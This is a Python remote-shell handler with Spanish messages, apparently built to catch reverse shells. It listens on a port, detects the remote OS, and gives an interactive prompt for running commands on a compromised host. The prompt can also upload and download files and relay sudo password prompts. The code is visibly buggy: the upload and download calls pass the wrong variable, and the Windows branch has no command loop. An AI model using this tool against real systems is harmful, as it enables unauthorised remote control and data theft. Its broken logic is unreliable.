from listen_manager import *
import sys
from pwn import *


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <puerto>")
        sys.exit(1)
    
    try:
        port = int(sys.argv[1])
        conn, ok = start_listener(port)
        if threading.current_thread() is threading.main_thread():
            signal.signal(signal.SIGINT, sigint_handler)

        remote_os = detect_remote_os()
        log.info(f"Sistema operativo remoto detectado: {remote_os}")

        if remote_os == "Linux":
            user = get_clean_response('whoami') or "user"
            path = get_clean_response('pwd') or "/"
        elif remote_os == "Windows":
            user = get_clean_response('echo %USERNAME%') or "user"
            path = get_clean_response('echo %CD%') or "C:\\"
        
        if remote_os == "Linux":

            while True:
                user_colored = f"\033[1;34m{user}\033[0m"  # Azul
                path_colored = f"\033[1;32m{path}\033[0m"  # Verde
                
                print(f"{user_colored}@{path_colored}:$ ", end="", flush=True)
                cmd = sys.stdin.readline().strip()
                if not cmd:
                    continue
                
                if cmd.lower() == "exit":
                    log.info("Cerrando conexión...")
                    break

                elif cmd.startswith("help"):
                    print("\nUso de comandos disponibles:")
                    print("  upload <ruta_local>   - Sube un archivo a la máquina remota.")
                    print("  download <ruta_remota> - Descarga un archivo desde la máquina remota.")
                    print("  exit                   - Cierra la conexión de la shell.")
                    print("  clear                  - Limpia la pantalla del terminal.")
                    print("  sudo <comando>         - Ejecuta un comando como superusuario.")
                    print("\nEjemplo:")
                    print("  upload /home/user/file.txt")
                    print("  download /tmp/secreto.txt")
                    continue

                elif cmd.startswith("download "):
                    file_path = cmd.split(" ", 1)[1]
                    download_file(path)

                elif cmd.startswith("upload "):
                    file_path = cmd.split(" ", 1)[1]
                    upload_file(path)

                elif cmd.startswith("sudo "):
                    conn.sendline(f"export TERM=xterm; script -qc \"{cmd}\" /dev/null".encode())
                    output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip().split("\n")[0])
                    if "password for" in output.lower():
                        print(output)
                        password = sys.stdin.readline().strip()
                        conn.sendline(password.encode())
                    output = clean_ansi(conn.recvrepeat(1.5).decode(errors='ignore').strip())
                    print(output)
                else:
                    conn.sendline(cmd.encode())
                    conn.recvline(timeout=0.5)
                    output = clean_ansi(conn.recvrepeat(0.5).decode(errors='ignore').strip())
                    if output:
                        print(output)




    except ValueError:
        log.error("El puerto debe ser un número entero válido.")
